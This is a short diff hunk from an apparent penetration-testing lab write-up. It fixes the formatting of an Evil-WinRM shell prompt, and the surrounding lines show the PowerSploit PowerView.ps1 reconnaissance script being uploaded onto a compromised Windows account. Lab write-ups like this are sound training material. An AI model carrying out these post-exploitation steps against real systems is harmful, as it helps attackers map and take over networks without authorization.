@@ -259,7 +259,7 @@ Please choose a path [0-1]
 ```
 ##  PowerView
 ```markdown
-Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/PowerSploit/Recon/PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/PowerSploit/Recon/PowerView.ps1
 Info: Uploading /root/tools/PowerSploit/Recon/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1                                                                                                
 
 Data: 1027040 bytes of 1027040 bytes copied
